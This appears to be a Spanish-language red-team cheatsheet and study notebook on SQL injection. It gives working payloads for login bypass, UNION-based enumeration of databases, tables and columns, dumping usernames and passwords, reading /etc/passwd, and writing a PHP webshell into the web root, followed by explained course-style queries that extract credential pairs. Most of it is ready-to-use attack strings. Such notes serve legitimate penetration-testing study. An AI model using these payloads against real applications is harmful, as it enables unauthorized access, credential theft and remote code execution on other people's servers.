---
aliases:
tags:
  - type/cheatsheet
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
tertiary categories:
  - "[[Explotación Web]]"
type: CheatSheet
linked:
  - "[[SQL Commands]]"
  - "[[SQLi Enumeration]]"
  - "[[MySQL Read & Write]]"
  - "[[SQLi to RCE]]"
  - "[[SQLi - Error based]]"
  - "[[SQLi  - Union based]]"
  - "[[SQLi - Boolean based]]"
  - "[[SQLi - Time based]]"
  - "[[SQLi - Out of Band]]"
  - "[[SQLi - Second order]]"
  - "[[SQLi - Routed]]"
  - "[[SQLi - Lateral]]"
---
# SQL Injection (SQLi)

***

## Cheatsheet

### In-Band SQLi

````tabs

tab: **Union-based**
![[SQLi  - Union based#^sqli-union]]

tab: **Error-based**
![[SQLi - Error based#^sqli-error]]
````

### Inferential Blind

````tabs
tab: **Boolean-based Blind**
![[SQLi - Boolean based#^sqli-boolean]]

tab: **Time-based Blind**
![[SQLi - Time based#^sqli-time]]
````

### Out-of-Band

````tabs
tab: **OOB**
![[SQLi - Out of Band#^sqli-out]]
````

### Técnicas Avanzadas y de Contexto Específico

````tabs
tab: **Second-order**
![[SQLi - Second order#^sqli-second]]

tab: **Routed**
![[SQLi - Routed#^sqli-routed]]

tab: **Lateral**
![[SQLi - Lateral#^sqli-lateral]]
````


___

## Paso a paso

### 1. Auth Bypass (Acceso Inicial)

_Payloads para saltarse formularios de login._
```SQL
admin' or '1'='1       -- Bypass básico
admin')-- -            -- Bypass con cierre de paréntesis y comentario
```

### 2. Reconocimiento y Estructura (Union-Based Setup)

_Determinar la cantidad de columnas para poder usar `UNION SELECT`._
```SQL
' order by 1-- -       -- Detectar columnas incrementando el número (1, 2, 3...)
cn' UNION select 1,2,3-- -  -- Validar inyección Union (si hay 3 columnas)
```

### 3. Enumeración de Base de Datos

_Una vez confirmada la inyección Union, extraer información del sistema._
```SQL
-- Versión y Fingerprinting
SELECT @@version       -- Versión de la DB (en output)
SELECT SLEEP(5)        -- Fingerprint basado en tiempo (Blind)

-- Base de datos actual
cn' UNION select 1,database(),2,3-- -
```

### 4. Enumeración de Esquema (Information_Schema)

_Mapeo completo de la base de datos._
```SQL
-- Listar TODAS las bases de datos
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

-- Listar TABLAS de una base de datos específica ('dev')
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -

-- Listar COLUMNAS de una tabla específica ('credentials')
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -

-- Dumpear DATOS (Extraer usuarios y passwords)
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

### 5. Privilegios del Usuario

_¿Qué permisos tiene el usuario con el que corre la DB?_
```SQL
-- Usuario actual
cn' UNION SELECT 1, user(), 3, 4-- -

-- Verificar si es Super Admin (root)
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -

-- Listar todos los privilegios
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -

-- Verificar permisos de archivos (importante para LFI/RCE)
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

### 6. SQLi to RCE (File I/O)

_Escalada crítica: Leer archivos del sistema o escribir webshells._

**LFI (Local File Inclusion / Lectura):**
```SQL
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

**File Write (Escritura de Archivos):**
```SQL
-- Verificar permiso
foo' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -

-- Prueba de escritura simple
select 'file written successfully!' into outfile '/var/www/html/proof.txt'

-- RCE: Escribir una Webshell PHP
cn' union select "",'<?=`$_GET[0]`?>', "", "" into outfile '/var/www/html/shell.php'-- -
# http://STMIP:STMPO/shell.php?0=cat%20../etc/passwd
```

***

## Overview










***

/etc/nginx//sites-enabled/default
 /etc/apache2/sites-enabled/000-default.conf
 
|**Payload (Carácter Especial)**|**Valor URL Encoded**|**Función Estructural en Inyecciones**|
|---|---|---|
|`'` (Comilla simple)|`%27`|Ruptura de cadenas de texto y escape de contexto principal.|
|`"` (Comilla doble)|`%22`|Ruptura de identificadores o strings alternativos (depende del SGBD).|
|`#` (Almohadilla)|`%23`|Operador de comentario en [[MySQL]]; trunca el resto de la consulta original.|
|`;` (Punto y coma)|`%3B`|Terminador de sentencias; crucial para habilitar inyecciones apiladas (Stacked Queries).|
|`)` (Paréntesis de cierre)|`%29`|Equilibrio de sintaxis; permite cerrar funciones o subconsultas previas al payload.|


### 1. Obtener un nombre de usuario específico
```sql
select username from users where id = '3';
```
Esta consulta selecciona el nombre de usuario del registro en la tabla `users` donde el `id` es igual a `3`.

### 2. Intentar ordenar por columnas desconocidas
```sql
select username from users where id = '3' order by 3;
select username from users where id = '3' order by 2;
select username from users where id = '3' order by 1;
```
Estas consultas intentan ordenar los resultados por diferentes números de columna. Este es un método para identificar cuántas columnas están siendo seleccionadas en la consulta original. Si ordenas por una columna que no existe, obtendrás un error, lo cual te dice cuántas columnas hay realmente en la selección.

### 3. Usar `UNION` para añadir resultados adicionales
```sql
select username from users where id = '3' union select 1;
```
Aquí, intentas agregar una fila adicional al conjunto de resultados con un valor estático `1`. Esto es un paso inicial para verificar si la inyección SQL con `UNION` es posible. Si la consulta se ejecuta sin errores, significa que puedes combinar resultados adicionales.

### 4. Probar `UNION` con un ID que no existe
```sql
select username from users where id = '332131' union select 1;
```
Esta consulta es similar a la anterior, pero ahora estás seleccionando un ID que probablemente no existe (`332131`). Si la consulta aún devuelve resultados, puedes verificar que `UNION` está funcionando correctamente para agregar resultados arbitrarios.

### 5. Obtener nombres de bases de datos
```sql
select username as BASES_DE_DATOS from users where id = '332131' union select schema_name from information_schema.schemata;
```
En esta consulta, usas `UNION` para obtener nombres de todas las bases de datos en el servidor. `information_schema.schemata` contiene información sobre todas las bases de datos disponibles. Renombras la columna resultante como `BASES_DE_DATOS` para claridad. 
**En la web para ver todo puedo usar group_concat**
```sql
select username as BASES_DE_DATOS from users where id = '332131' union select group_concat(schema_name) from information_schema.schemata-- -';
```

### 6. Obtener nombres de tablas en una base de datos específica
```sql
select username as TABLAS_DE_HACK4U from users where id = '332131' union select table_name from information_schema.tables where table_schema = 'hack4u';
```
Aquí, estás obteniendo los nombres de todas las tablas dentro de la base de datos `hack4u`. `information_schema.tables` contiene información sobre todas las tablas. Filtras los resultados para la base de datos específica `hack4u` y renombras la columna resultante como `TABLAS_DE_HACK4U`.

### 7. Obtener nombres de columnas en una tabla específica
```sql
select username as COLUMNAS_DE_HACK4U from users where id = '332131' union select column_name from information_schema.columns where table_schema = 'hack4u' and table_name = 'users';
```
En esta consulta, estás obteniendo los nombres de todas las columnas dentro de la tabla `users` de la base de datos `hack4u`. `information_schema.columns` contiene información sobre todas las columnas. Filtras los resultados para la tabla y base de datos específica y renombras la columna resultante como `COLUMNAS_DE_HACK4U`.

### 8. Obtener todos los nombres de usuario
```sql
select username as USUARIOS from users where id = '332131' union select username from users;
```
Ahora, obtienes todos los nombres de usuario en la tabla `users`. Renombras la columna resultante como `USUARIOS` para claridad.

### 9. Obtener todas las contraseñas
```sql
select username as CONTRASEÑAS from users where id = '332131' union select password from users;
```
Finalmente, obtienes todas las contraseñas de la tabla `users`. Renombras la columna resultante como `CONTRASEÑAS` para claridad.
(si no estuviera conectado con la base de datos `hacku4` tendría que poner `hack4u.users`para que funcione)

### 9.1 Agregar `group_concat` para ver usuario y contraseña al lado
```sql
select username from users where id = '332131' union select group_concat(username,':',password) from users;
```
En algunos casos el campo `':'` puede dar problemas en la url por las comillas, en tal caso podría ser recomendable ponerlos en hexadecimal (`0x3a`).
```sql
select username from users where id = '332131' union select group_concat(username,0x3a,password) from users;
```
